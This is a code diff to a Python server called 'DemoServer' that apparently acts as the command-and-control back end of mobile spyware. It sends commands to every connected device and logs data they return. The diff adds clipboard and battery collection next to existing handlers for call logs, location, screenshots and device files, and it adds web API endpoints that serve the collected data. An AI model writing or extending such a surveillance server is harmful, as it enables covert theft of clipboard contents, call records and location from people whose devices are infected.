@@ -67,6 +67,8 @@ class DeviceSession:
         self.last_storage_info = None
         self.last_location = None
         self.last_device_info = None
+        self.last_battery_info = None
+        self.last_clipboard = None
 
 
 class DemoServer:
@@ -378,6 +380,12 @@ class DemoServer:
 
                 elif command == "screenshot":
                     self.send_command_to_all("screenshot")
+
+                elif command == "get_battery_info":
+                    self.send_command_to_all("get_battery_info")
+
+                elif command == "get_clipboard":
+                    self.send_command_to_all("get_clipboard")
 
                 else:
                     print(f"Unknown command: {command}. Type 'help' for available commands.")
@@ -756,6 +764,39 @@ class DemoServer:
                 except Exception as e:
                     self.log(f"[!] Failed to process screenshot: {e}")
 
+        # === v6.0 Battery Info ===
+        elif msg_type == "battery_info":
+            percent = message.get("percent", "?")
+            status = message.get("status", "?")
+            plugged = message.get("plugged", "?")
+            temp = message.get("temperature", "?")
+            voltage = message.get("voltage", "?")
+            health = message.get("health", "?")
+            session.last_battery_info = message
+            self.log(f"[i] Battery info from session {session.session_id}:")
+            self.log(f"    Level: {percent}%")
+            self.log(f"    Status: {status}")
+            self.log(f"    Plugged: {plugged}")
+            self.log(f"    Temperature: {temp}°C")
+            self.log(f"    Voltage: {voltage}V")
+            self.log(f"    Health: {health}")
+            self.log_to_file(message, session.address)
+
+        # === v6.0 Clipboard ===
+        elif msg_type == "clipboard":
+            text = message.get("text", "")
+            note = message.get("note", "")
+            session.last_clipboard = message
+            self.log(f"[i] Clipboard from session {session.session_id}:")
+            if text:
+                display = text[:100] + ("..." if len(text) > 100 else "")
+                self.log(f"    Content: {display}")
+            else:
+                self.log(f"    Content: (empty)")
+            if note:
+                self.log(f"    Note: {note}")
+            self.log_to_file(message, session.address)
+
         # === v4.0 NEW MESSAGE HANDLERS ===
 
         elif msg_type == "call_logs":
@@ -927,6 +968,10 @@ class ThreadedHTTPRequestHandler(BaseHTTPRequestHandler):
             self.handle_get_storage(query)
         elif path == '/api/device-info':
             self.handle_get_device_info_data(query)
+        elif path == '/api/battery':
+            self.handle_get_battery(query)
+        elif path == '/api/clipboard':
+            self.handle_get_clipboard(query)
         else:
             self.send_error(404, "Not Found")
 
@@ -1235,6 +1280,18 @@ class ThreadedHTTPRequestHandler(BaseHTTPRequestHandler):
         with self.server_instance.lock:
             session = self.server_instance.sessions.get(int(sid))
             self.send_json_response({'device_info': session.last_device_info} if session else {'device_info': {}})
+
+    def handle_get_battery(self, query):
+        sid = query.get('session', ['1'])[0]
+        with self.server_instance.lock:
+            session = self.server_instance.sessions.get(int(sid))
+            self.send_json_response({'battery': session.last_battery_info} if session else {'battery': {}})
+
+    def handle_get_clipboard(self, query):
+        sid = query.get('session', ['1'])[0]
+        with self.server_instance.lock:
+            session = self.server_instance.sessions.get(int(sid))
+            self.send_json_response({'clipboard': session.last_clipboard} if session else {'clipboard': {}})
 
     def handle_delete_file(self, query):
         """Delete a file from received_files directory."""
